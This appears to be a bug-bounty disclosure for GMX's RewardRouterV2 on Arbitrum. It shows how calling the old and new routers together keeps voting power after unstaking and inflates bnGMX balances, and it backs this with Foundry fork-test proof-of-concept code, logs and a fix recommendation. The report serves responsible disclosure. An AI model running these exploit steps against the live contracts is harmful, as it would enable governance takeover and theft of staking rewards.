## Manipulating Voting Power and BnGMX Balance through the Combination of Old and New RewardRouterV2

### Brief/Intro

1. A malicious user can acquire a large amount of VotingPower with the combination of old and new versions of rewardRouterV2.

2. A malicious user may manipulate the bnGMX balance with the combination of old and new versions of rewardRouterV2.


new RewardRouterV2 https://arbiscan.io/address/0x159854e14a862df9e39e1d128b8e5f70b4a3ce9b

old RewardRouterV2 https://arbiscan.io/address/0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1

These two contacts have exactly the same state variables except for the GlpManager. 

And now the old contact is operating in the same environment as the new contact without any restrictions. 

This is giving malicious users a chance to steal.

### Vulnerability Details

### 1. VotingPower Manipulation. (Critical)

The attacker call unstakeGmx function of RewardRouter(old), not new version. The staked amount is 0, but the votingPower is not zero yet.

POC:

```solidity
pragma solidity ^0.8.13;

import "../../src/PoC.sol";
import "../../src/protocols/GMX/interfaces/IRewardRouterV2.sol";
import "../../src/protocols/GMX/interfaces/IRewardTracker.sol";

contract RewardRouterV2VotingPowerBugTest is PoC {

    uint256 private arbitrumFork;


    IERC20[] private tokens;

    IERC20 private constant gmx = IERC20(0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a);
    IERC20 private constant govToken = IERC20(0x2A29D3a792000750807cc401806d6fd539928481);

    IRewardRouterV2 private constant rewardRouterV2Old = IRewardRouterV2(0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1);
    IRewardRouterV2 private constant rewardRouterV2New = IRewardRouterV2(0x159854e14A862Df9E39E1D128b8e5F70B4A3cE9B);

    IRewardTracker private constant stakedGmxTracker = IRewardTracker(0x908C4D94D34924765f1eDc22A1DD098397c59dD4);

    address private user = address(0xc7f1De8EeB686E7ccBa4b4CEEFDC9Bd8f51364F9);
    address private gov = address(0xF5d278923f4CB4fcfa36Af6F064B8b3d0A8eC7e3);

    uint256 unstakeAmount;

    function setUp() public {
        arbitrumFork = vm.createFork("arbitrum", 190041754);
        vm.selectFork(arbitrumFork);


        unstakeAmount = IRewardTracker(stakedGmxTracker).stakedAmounts(user);


        console.log("Setting: VotingPowerType -> BaseStakedAmount type");
        vm.prank(gov);
        rewardRouterV2New.setVotingPowerType(IRewardRouterV2.VotingPowerType.BaseStakedAmount);

        console.log("-- Sync --");
        vm.prank(user);
        rewardRouterV2New.compound();

        console.log("Full unstakeGmx: ", unstakeAmount);

        console.log("Before unstaking.");
        _printValues(user);

        console.log("\n>>> Initial conditions");
    }

    function _printValues(address _account) public {
        uint256 baseStakedAmount = IRewardTracker(stakedGmxTracker).stakedAmounts(_account);
        uint256 govTokenBalance = govToken.balanceOf(_account);

        console.log("----- Status -----");
        console.log("baseStakedAmount                   : ", baseStakedAmount);
        console.log("votingPower(govTokenBalance )      : ", govTokenBalance);
        console.log("\n");
    }

    function test1OnlyUseRewardRouterV2New() public {

        console.log("\n");
        console.log("=======================================================");
        console.log("When using only new rewardRouterV2!");
        console.log("=======================================================");
        console.log("\n");

        vm.prank(user);
        rewardRouterV2New.unstakeGmx(unstakeAmount);

        console.log("After unstaking.");
        _printValues(user);
    }

    function test2OnlyUseRewardRouterV2Old() public {

        console.log("\n");
        console.log("=======================================================");
        console.log("When using only old rewardRouterV2!");
        console.log("=======================================================");
        console.log("\n");


        vm.prank(user);
        rewardRouterV2Old.unstakeGmx(unstakeAmount);

        _printValues(user);
    }
}
```

LOG:

```
Ran 2 tests for test/RewardRouterV2VotingPowerBugTest.t.sol:RewardRouterV2VotingPowerBugTest
[PASS] test1OnlyUseRewardRouterV2New() (gas: 353789)
Logs:
  Setting: VotingPowerType -> BaseStakedAmount type
  -- Sync --
  Full unstakeGmx:  38087742019457775233546
  Before unstaking.
  ----- Status -----
  baseStakedAmount                   :  38087742019457775233546
  votingPower(govTokenBalance )      :  38087742019457775233546
  

  
>>> Initial conditions
  

  =======================================================
  When using only new rewardRouterV2!
  =======================================================
  

  After unstaking.
  ----- Status -----
  baseStakedAmount                   :  0
  votingPower(govTokenBalance )      :  0
  


[PASS] test2OnlyUseRewardRouterV2Old() (gas: 323815)
Logs:
  Setting: VotingPowerType -> BaseStakedAmount type
  -- Sync --
  Full unstakeGmx:  38087742019457775233546
  Before unstaking.
  ----- Status -----
  baseStakedAmount                   :  38087742019457775233546
  votingPower(govTokenBalance )      :  38087742019457775233546
  

  
>>> Initial conditions
  

  =======================================================
  When using only old rewardRouterV2!
  =======================================================
  

  ----- Status -----
  baseStakedAmount                   :  0
  votingPower(govTokenBalance )      :  38087742019457775233546
  


Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.07s
```

### Impact Details

If an attacker borrows a large amount of GMX and proceeds with a stake in RewardRouterV2(new) and unstakes it with RewardRouterV2(old), the attacker can acquire a large amount of voting power.

Then he can manipulate everything in the protocol with absolute voting rights for all proposals. The attacker can also steal all of the contract's funds.

### 2. bnGmx balance and stake amount of the token Manipulation. (High)

The attacker is trying to unstake half of the total baseStakeAmount. 

Now he tries to detour the normal logic.

**Attack Scenario**

- The attacker call unstakeGmx function of RewardRouterV2(new) with 1wei.

- The attacker call unstakeGmx function of RewardRouterV2(old) with baseStakedAmount / 2 - 1.

- The attacker call compound function of RewardRouterV2(new).

POC:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "../../src/PoC.sol";
import "../../src/protocols/GMX/interfaces/IRewardRouterV2.sol";
import "../../src/protocols/GMX/interfaces/IRewardTracker.sol";

contract RewardRouterV2BnGMXBugTest is PoC {
    uint256 private arbitrumFork;
    uint256 private constant BASIS_POINTS_DIVISOR = 10000;

    IERC20[] private tokens;

    IERC20 private constant gmx = IERC20(0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a);
    IERC20 private constant bnGmx = IERC20(0x35247165119B69A40edD5304969560D0ef486921);

    IRewardRouterV2 private constant rewardRouterV2Old = IRewardRouterV2(0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1);
    IRewardRouterV2 private constant rewardRouterV2New = IRewardRouterV2(0x159854e14A862Df9E39E1D128b8e5F70B4A3cE9B);

    IRewardTracker private constant feeGmxTracker = IRewardTracker(0xd2D1162512F927a7e282Ef43a362659E4F2a728F);
    IRewardTracker private constant stakedGmxTracker = IRewardTracker(0x908C4D94D34924765f1eDc22A1DD098397c59dD4);

    address private user = address(0xc7f1De8EeB686E7ccBa4b4CEEFDC9Bd8f51364F9);

    uint256 unstakeAmount;

    function setUp() public {
        console.log("Fork arbitrum network (Mar-13-2024 06:54:43 PM +UTC)");
        arbitrumFork = vm.createFork("arbitrum", 190041754);
        vm.selectFork(arbitrumFork);

        tokens.push(bnGmx);

        uint256 baseStakedAmount = IRewardTracker(stakedGmxTracker).stakedAmounts(user);
        unstakeAmount = baseStakedAmount / 2;

        console.log("Unstake amount (baseStakedAmount / 2): ", unstakeAmount);

        console.log("Before unstaking.");
        _printValues(user);

        console.log("\n>>> Initial conditions");
    }

    function _printValues(address _account) public {
        uint256 stakedBnGmx = IRewardTracker(feeGmxTracker).depositBalances(_account, address(bnGmx));
        uint256 baseStakedAmount = IRewardTracker(stakedGmxTracker).stakedAmounts(_account);
        uint256 bnGmxAmount = bnGmx.balanceOf(_account);

        console.log("----- Status -----");
        console.log("baseStakedAmount  : ", baseStakedAmount);
        console.log("stakedBnGmx       : ", stakedBnGmx);
        console.log("bnGmxBalance      : ", bnGmxAmount);
        console.log("totalbnGmxAmount  : ", bnGmxAmount + stakedBnGmx);
        console.log("\n");
    }

    function test1OnlyUseRewardRouterV2Old() public {

        console.log("\n");
        console.log("=======================================================");
        console.log("When using only old rewardRouterV2!");
        console.log("=======================================================");
        console.log("\n");


        vm.prank(user);
        rewardRouterV2Old.unstakeGmx(unstakeAmount);

        _printValues(user);
    }

    function test2OnlyUseRewardRouterV2New() public {

        console.log("\n");
        console.log("=======================================================");
        console.log("When using only new rewardRouterV2!");
        console.log("=======================================================");
        console.log("\n");

        vm.prank(user);
        rewardRouterV2New.unstakeGmx(unstakeAmount);

        console.log("After unstaking.");
        _printValues(user);
    }

    function test3AttackCompoundingOldAndNew() public {

        console.log("\n");
        console.log("=======================================================");
        console.log("When using old rewardRouterV2 and new rewardRouterV2!");
        console.log("=======================================================");
        console.log("\n");

        vm.startPrank(user);

        console.log("-- Unstake only 1 wei using new rewardRouterV2 --");
        rewardRouterV2New.unstakeGmx(1);
        _printValues(user);

        console.log("-- Unstake left amount (baseStakedAmount / 2 - 1) using new rewardRouterV2 --");
        uint256 amount = unstakeAmount - 1;
        rewardRouterV2Old.unstakeGmx(amount);
        _printValues(user);

        console.log("-- Call compound function of new rewardRouterV2 --");
        rewardRouterV2New.compound();

        vm.stopPrank();

        console.log("After unstaking.");
        _printValues(user);
    }

    function test4AttackOverMaxAllowedBnGmxAmount() public {
        console.log("\n");
        console.log("=======================================================");
        console.log("--------       Over maxAllowedBnGmxAmount       -------");
        console.log("=======================================================");
        console.log("\n");

        vm.startPrank(user);

        rewardRouterV2New.unstakeGmx(1);
        uint256 baseStakedAmount = IRewardTracker(stakedGmxTracker).stakedAmounts(user);
        uint256 amount = baseStakedAmount * 9 / 10 - 1;
        rewardRouterV2Old.unstakeGmx(amount);
        rewardRouterV2New.compound();

        _printValues(user);


        uint256 currentTime = block.timestamp;
        uint256 oneYear = 1 * 365 days;
        vm.warp(currentTime + oneYear);

        rewardRouterV2Old.compound();

        vm.stopPrank();

        console.log("After 1 year.");
        _printValues(user);

        baseStakedAmount = IRewardTracker(stakedGmxTracker).stakedAmounts(user);
        uint256 maxAllowedBnGmxAmount = baseStakedAmount * rewardRouterV2New.maxBoostBasisPoints() / BASIS_POINTS_DIVISOR;
        uint256 stakedBnGmx = IRewardTracker(feeGmxTracker).depositBalances(user, address(bnGmx));
        console.log("Over maxAllowedBnGmxAmount? ", stakedBnGmx > maxAllowedBnGmxAmount ? true : false);

    }
}
```

If the user follow the normal logic, the user should unstake and then burn half of the claimed bnGMX. 

However, the entire newly claimed bnGMX token still remains.

### Impact Details

Users benefit more from exploiting this vulnerability by holding and staking relatively more bnGmx than other users.

If a malicious user continues to use the compound function of RewardRouterV2(old) without using RewardRouterV2(new), the user can stake more bnGmx than maxAllowedBnGmxAmount. 

If this is prolonged, the attacker can take almost all of the compensation from feeGmxTacker.


### Recommendation

The solution is to disable old RewardRouterV2

old RewardRouterV2 0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1 https://arbiscan.io/address/0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1